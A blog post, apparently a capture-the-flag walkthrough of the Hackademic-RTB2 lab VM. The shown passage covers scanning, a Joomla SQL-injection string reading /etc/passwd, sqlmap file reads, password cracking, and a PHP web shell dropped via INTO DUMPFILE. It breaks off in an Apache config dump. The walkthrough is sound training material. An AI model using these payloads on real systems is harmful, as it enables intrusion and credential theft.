@@ -1,0 +1,942 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Solving Hackademic-RTB2 - forelsec</title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="Here&rsquo;s the second distro from mr. pr0n&rsquo;s realistic pentest discs. This one was quite fun as I had almost zero experience with Joomla &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2012/11/18/solving-hackademic-rtb2">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="forelsec" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">forelsec</a></h1>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/code">Code</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Solving Hackademic-RTB2</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2012-11-18T01:24:24-07:00" pubdate data-updated="true">Nov 18<span>th</span>, 2012</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Here&rsquo;s the second distro from mr. pr0n&rsquo;s realistic pentest discs.  This one was quite fun as I had almost zero experience with Joomla front ends, which so happens to be the entry point on this disc.  A little disappointed with the finale, but overall impressed with this disc.  With that, the iconic nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 6.01 scan initiated Wed Nov 14 16:45:09 2012 as: nmap -sS -p- -T5 -A -oN r2.scan 192.168.1.75
+</span><span class='line'>Nmap scan report for 192.168.1.75
+</span><span class='line'>Host is up (0.00016s latency).
+</span><span class='line'>Not shown: 65533 closed ports
+</span><span class='line'>PORT    STATE    SERVICE VERSION
+</span><span class='line'>80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
+</span><span class='line'>|_http-title: Hackademic.RTB2
+</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+</span><span class='line'>666/tcp filtered doom
+</span><span class='line'>MAC Address: 08:00:27:E5:D1:B9 (Cadmus Computer Systems)
+</span><span class='line'>Device type: general purpose
+</span><span class='line'>Running: Linux 2.6.X
+</span><span class='line'>OS CPE: cpe:/o:linux:kernel:2.6
+</span><span class='line'>OS details: Linux 2.6.17 - 2.6.36, Linux 2.6.19 - 2.6.35
+</span><span class='line'>Network Distance: 1 hop
+</span><span class='line'>
+</span><span class='line'>TRACEROUTE
+</span><span class='line'>HOP RTT     ADDRESS
+</span><span class='line'>1   0.16 ms 192.168.1.75
+</span><span class='line'>
+</span><span class='line'>OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+</span><span class='line'># Nmap done at Wed Nov 14 16:45:22 2012 -- 1 IP address (1 host up) scanned in 13.36 seconds</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Much like the first one, we&rsquo;ve essentially just got an HTTP server.  Port 666 is tagged as Doom, but its likely there&rsquo;s something else on there.</p>
+
+<p><img src="/images/posts/2012/hrt2_1.jpg"></p>
+
+<p>There&rsquo;s the main page.  Doesn&rsquo;t look to be hosted on a web platform, and it doesn&rsquo;t appear to be vulnerable to any SQLi.  Running a few queries&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/web/nikto# perl nikto.pl -host http://192.168.1.75
+</span><span class='line'>- Nikto v2.1.5
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Target IP:          192.168.1.75
+</span><span class='line'>+ Target Hostname:    192.168.1.75
+</span><span class='line'>+ Target Port:        80
+</span><span class='line'>+ Start Time:         2012-11-15 18:41:46 (GMT-6)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ Server: Apache/2.2.14 (Ubuntu)
+</span><span class='line'>+ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
+</span><span class='line'>+ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
+</span><span class='line'>+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+</span><span class='line'>+ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</span><span class='line'>+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+</span><span class='line'>+ OSVDB-3268: /icons/: Directory indexing found.
+</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
+</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found
+</span><span class='line'>+ 6474 items checked: 0 error(s) and 8 item(s) reported on remote host
+</span><span class='line'>+ End Time:           2012-11-15 18:42:00 (GMT-6) (14 seconds)
+</span><span class='line'>---------------------------------------------------------------------------
+</span><span class='line'>+ 1 host(s) tested
+</span><span class='line'>root@bt:/pentest/web/nikto# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/posts/2012/hrt2_2.jpg"></p>
+
+<p>There appears to be a phpMyAdmin not locked down, but it doesn&rsquo;t appear to be vulnerable to anything right off the bat.  Checking that 666 port again, connecting with netcat seems to dump out a bunch of HTML.  Weird; connecting now&hellip;</p>
+
+<p><img src="/images/posts/2012/hrt2_3.jpg"></p>
+
+<p>It appears that port 666 has some form of port knocking or filtering enabled.  It also appears to be hosted on Joomla 1.5.  <a href="http://cxsecurity.com/issue/WLB-2008080155">There&rsquo;s</a> an interesting SQLi for early 1.5 builds, but alas this one is already patched.  This is the part where I had to do a lot of googling; I&rsquo;ve only ever made cosmetic modifications to Joomla sites.  The gist of evaluating a Joomla box is enumeration of plugins/modules and platform vulnerabilities.  Plugins are typically found at <a href="http://site.com/index.php?option=com_MODULE.">http://site.com/index.php?option=com_MODULE.</a>  From there it&rsquo;s sqlmapping, exploit-db&#8217;ing (when it&rsquo;s available&hellip;), and googling.  Fortunately I stumbled upon a tool that tossed a lot of this toil into a simple package; NBS 0.3 Joomla Addon Attack Tool.  This came prepackaged with vulnerable plugin lists that evaluated their existence on the box as well as whether they were vulnerable or not.  The tool required a bit of tweaking on my part to account for the non-default port, but otherwise it worked well:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-=[ NBS 0.3 - Joomla Addon Attack Tool ]=-
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Make sure you write 'Yes' or 'No' without apostrophes.
+</span><span class='line'>Do you wish to scan for addons? Yes or No: Yes
+</span><span class='line'>
+</span><span class='line'>-= Joomla Addon Vulnerability Scanner =-
+</span><span class='line'>
+</span><span class='line'>Example: http://www.domain.tld
+</span><span class='line'>[-] Enter a target to scan: http://192.168.1.75
+</span><span class='line'>[-] Enter the target port [80]: 666
+</span><span class='line'>[*] Trying: index.php?option=com_jscalendar&view=jscalendar&task=details&ev_id= 
+</span><span class='line'>[*] Trying: index.php?option=com_jedirectory&view=item&catid= 
+</span><span class='line'>[*] Trying: index.php?option=com_jejob&view=item_detail&itemid= 
+</span><span class='line'>[*] Trying: index.php?option=com_elite_experts&task=showExpertProfileDetailed&getExpertsFromCountry=&language=ru&id= 
+</span><span class='line'>[*] Trying: index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode= 
+</span><span class='line'>[*] Trying: index.php?option=com_timetrack&view=timetrack&ct_id= 
+</span><span class='line'>[*] Trying: index.php?option=com_jgen&task=view&id= 
+</span><span class='line'>[*] Trying: index.php?option=com_zoomportfolio&view=portfolio&view=portfolio&id= 
+</span><span class='line'>[*] Trying: index.php?option=com_fabrik&view=table&tableid= 
+</span><span class='line'>[*] Trying: index.php?option=com_zina&view=zina&Itemid= 
+</span><span class='line'>[*] Trying: index.php?option=com_ongallery&task=ft&id= 
+</span><span class='line'>[*] Trying: index.php?option=com_equipment&view=details&id= 
+</span><span class='line'>[*] Trying: index.php?option=com_amblog&view=amblog&catid= 
+</span><span class='line'>[*] Addon Found: index.php?option=com_amblog&view=amblog&catid= 
+</span><span class='line'>[+] This addon appears to be vulnerable!
+</span><span class='line'>[+] Exploited with  index.php?option=com_amblog&view=amblog&catid=
+</span><span class='line'>[+] Full exploit string: /index.php?option=com_amblog&view=amblog&catid=-1+UNION+SELECT+load_file('/etc/passwd')
+</span><span class='line'>root@bt:~/hackademicr2/nbs03#</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just like that I knew the vulnerable plugin and the query string to exploit it.  This dumps:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:107::/var/run/dbus:/bin/false avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false saned:x:112:118::/home/saned:/bin/false hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false p0wnbox:x:1000:1000:p0wnbox,,,:/home/p0wnbox:/bin/bash mysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Playing around with sqlsus, we find:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/database/sqlsus# ./sqlsus hackr2.conf 
+</span><span class='line'>
+</span><span class='line'>              sqlsus version 0.7.2
+</span><span class='line'>
+</span><span class='line'>  Copyright (c) 2008-2011 Jérémy Ruffet (sativouf)
+</span><span class='line'>
+</span><span class='line'>[+] Session "192.168.1.75" created
+</span><span class='line'>sqlsus&gt; start
+</span><span class='line'>[+] Correct number of columns for UNION : 1 (1)
+</span><span class='line'>[+] Length restriction on URL : 8200 bytes                      
+</span><span class='line'>[+] Filling %target...
+</span><span class='line'>+----------+--------------------+
+</span><span class='line'>| Variable | Value              |
+</span><span class='line'>+----------+--------------------+
+</span><span class='line'>| database | joomla             |
+</span><span class='line'>| user     | 'root'@'localhost' |
+</span><span class='line'>| version  | 5.1.41-3ubuntu12.8 |
+</span><span class='line'>+----------+--------------------+
+</span><span class='line'>3 rows in set 
+</span><span class='line'>
+</span><span class='line'>sqlsus&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>And for reference:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/database/sqlsus# cat hackr2.conf | grep 192.168.1.75
+</span><span class='line'>our $url_start = "http://192.168.1.75:666/index.php?option=com_amblog&view=amblog&catid=-1";</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looking up the Joomla 1.5 <a href="http://docs.joomla.org/Detailed_list_of_fields">database schema</a>, we find the users can be found in jos_users:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlsus&gt; get columns jos_users
+</span><span class='line'>[+] Getting columns names for joomla.jos_users
+</span><span class='line'>+----------------------+                                              
+</span><span class='line'>| Columns in jos_users |
+</span><span class='line'>+----------------------+
+</span><span class='line'>| id                   |
+</span><span class='line'>| name                 |
+</span><span class='line'>| username             |
+</span><span class='line'>| email                |
+</span><span class='line'>| password             |
+</span><span class='line'>| usertype             |
+</span><span class='line'>| block                |
+</span><span class='line'>| sendemail            |
+</span><span class='line'>| gid                  |
+</span><span class='line'>| registerdate         |
+</span><span class='line'>| lastvisitdate        |
+</span><span class='line'>| activation           |
+</span><span class='line'>| params               |
+</span><span class='line'>+----------------------+
+</span><span class='line'>13 rows in set 
+</span><span class='line'>
+</span><span class='line'>sqlsus&gt; select id,username,password,usertype from jos_users
+</span><span class='line'>+----+---------------+-------------------------------------------------------------------+---------------------+
+</span><span class='line'>| id | username      | password                                                          | usertype            |
+</span><span class='line'>+----+---------------+-------------------------------------------------------------------+---------------------+
+</span><span class='line'>| 62 | Administrator | 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl | Super Administrator |
+</span><span class='line'>| 63 | JSmith        | 992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF | Registered          |
+</span><span class='line'>| 64 | BTallor       | abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy | Registered          |
+</span><span class='line'>+----+---------------+-------------------------------------------------------------------+---------------------+
+</span><span class='line'>3 rows in set (2 hits)
+</span><span class='line'>
+</span><span class='line'>sqlsus&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>These passwords are stored as md5(password + salt), so we need to load them up into Hashcat or john and let them run around.  As a note, I modified the hashes a bit to be in the form <code>username:md5$salt</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/passwords/john# john --wordlist=/pentest/passwords/wordlists/rockyou.txt --form=dynamic_1 /root/hackademicr2/hashes.txt 
+</span><span class='line'>Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 SSE2 intrinsics 32x4x1])
+</span><span class='line'>Remaining 1 password hash
+</span><span class='line'>guesses: 0  time: 0:00:00:03 DONE (Thu Nov 15 23:03:45 2012)  c/s: 4333K  trying:   b1tch3s   -  * 7¡Vamos! 
+</span><span class='line'>root@bt:/pentest/passwords/john# cat john.pot
+</span><span class='line'>$dynamic_1$992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF:matrix
+</span><span class='line'>$dynamic_1$abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy:victim
+</span><span class='line'>root@bt:/pentest/passwords/john# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well we got the two users, but no super admin.</p>
+
+<p>I handed the hash off for further cracking elsewhere, but lets again take a look at the results dirbuster turned up:</p>
+
+<p><img src="/images/posts/2012/hrt2_4.jpg"></p>
+
+<p>After more digging through Joomla documentation, turns out the &lsquo;configuration.php&rsquo; holds, surprise, Joomla site configurations, specifically..</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url "http://192.168.1.75:666/index.php?option=com_amblog&view=amblog&catid=-1" -p 'catid' --dbms mysql --file-read="/var/www/configuration.php"
+</span><span class='line'>[SNIP]
+</span><span class='line'>root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_var_www_configuration.php 
+</span><span class='line'>&lt;?php
+</span><span class='line'>class JConfig {
+</span><span class='line'>/* Site Settings */
+</span><span class='line'>var $offline = '0';
+</span><span class='line'>var $offline_message = 'This site is down for maintenance.&lt;br /&gt; Please check back again soon.';
+</span><span class='line'>var $sitename = 'Hackademic.RTB2';
+</span><span class='line'>var $editor = 'tinymce';
+</span><span class='line'>var $list_limit = '20';
+</span><span class='line'>var $legacy = '0';
+</span><span class='line'>/* Debug Settings */
+</span><span class='line'>var $debug = '0';
+</span><span class='line'>var $debug_lang = '0';
+</span><span class='line'>/* Database Settings */
+</span><span class='line'>var $dbtype = 'mysql';
+</span><span class='line'>var $host = 'localhost';
+</span><span class='line'>var $user = 'root';
+</span><span class='line'>var $password = 'yUtJklM97W';
+</span><span class='line'>var $db = 'joomla';
+</span><span class='line'>var $dbprefix = 'jos_';
+</span><span class='line'>/* Server Settings */
+</span><span class='line'>var $live_site = '';
+</span><span class='line'>var $secret = 'iFzlVUCg9BBPoUDU';
+</span><span class='line'>var $gzip = '0';
+</span><span class='line'>var $error_reporting = '-1';
+</span><span class='line'>var $helpurl = 'http://help.joomla.org';
+</span><span class='line'>var $xmlrpc_server = '0';
+</span><span class='line'>var $ftp_host = '127.0.0.1';
+</span><span class='line'>var $ftp_port = '21';
+</span><span class='line'>var $ftp_user = '';
+</span><span class='line'>var $ftp_pass = '';
+</span><span class='line'>var $ftp_root = '';
+</span><span class='line'>var $ftp_enable = '0';
+</span><span class='line'>var $force_ssl = '0';
+</span><span class='line'>[SNIP]</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Huzzah, root password hardcoded into the configuration file.  Note that this is only the MySQL root password, although its entirely possible that its also the system root password.  We know that there exists a phpMyAdmin listener, so lets log into that with our newfound credentials:</p>
+
+<p><img src="/images/posts/2012/hrt2_5.jpg"></p>
+
+<p>Now we&rsquo;ve got root on the database and access to the phpMyAdmin console.  From here, we can inject a backdoor that allows us to execute commands on the backend system.  This method was taken from <a href="http://www.securitytube.net/video/937">here</a>, though it&rsquo;s not exactly new.</p>
+
+<p>First we create a new table:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>CREATE TABLE shell(
+</span><span class='line'> Sauce TEXT
+</span><span class='line'>) ENGINE = MYISaM;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Here we&rsquo;re creating a new table, shell, with a single text field, Sauce, as a MYISaM container (<a href="http://dev.mysql.com/doc/refman/5.0/en/myisam-storage-engine.html">more here</a>).  Next we&rsquo;ll insert the actual shell interpreter into the table:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>INSERT INTO shell
+</span><span class='line'>VALUES(
+</span><span class='line'>'&lt;pre&gt;&lt;? @system($_REQUEST["v"]); ?&gt;&lt;/pre&gt;'
+</span><span class='line'>);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next we&rsquo;re going to need to dump to a php file for us to actually run with.  This can be done with the INTO DUMPFILE sql command, like so:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SELECT *
+</span><span class='line'>INTO DUMPFILE '/var/www/st.php'
+</span><span class='line'>FROM shell;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>How do we know to hit /var/www?  By pulling the default apache2 config file of course:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:/pentest/database/sqlmap# python sqlmap.py --url "http://192.168.1.75:666/index.php?option=com_amblog&view=amblog&catid=-1" -p 'catid' --dbms mysql --file-read='/etc/apache2/sites-available/default'
+</span><span class='line'>root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_etc_apache2_sites-available_default 
+</span><span class='line'>[SNIP]
+</span><span class='line'>&lt;VirtualHost *:666&gt;
+</span><span class='line'>    ServerAdmin webmaster@localhost
+</span><span class='line'>
+</span><span class='line'>    DocumentRoot /var/www
+</span><span class='line'>    &lt;Directory /&gt;
+</span><span class='line'>        Options FollowSymLinks
+</span><span class='line'>        AllowOverride None
+</span><span class='line'>    &lt;/Directory&gt;
+</span><span class='line'>    &lt;Directory /var/www/&gt;
+</span><span class='line'>        Options Indexes FollowSymLinks MultiViews
+</span><span class='line'>        AllowOverride None
+</span><span class='line'>        Order allow,deny
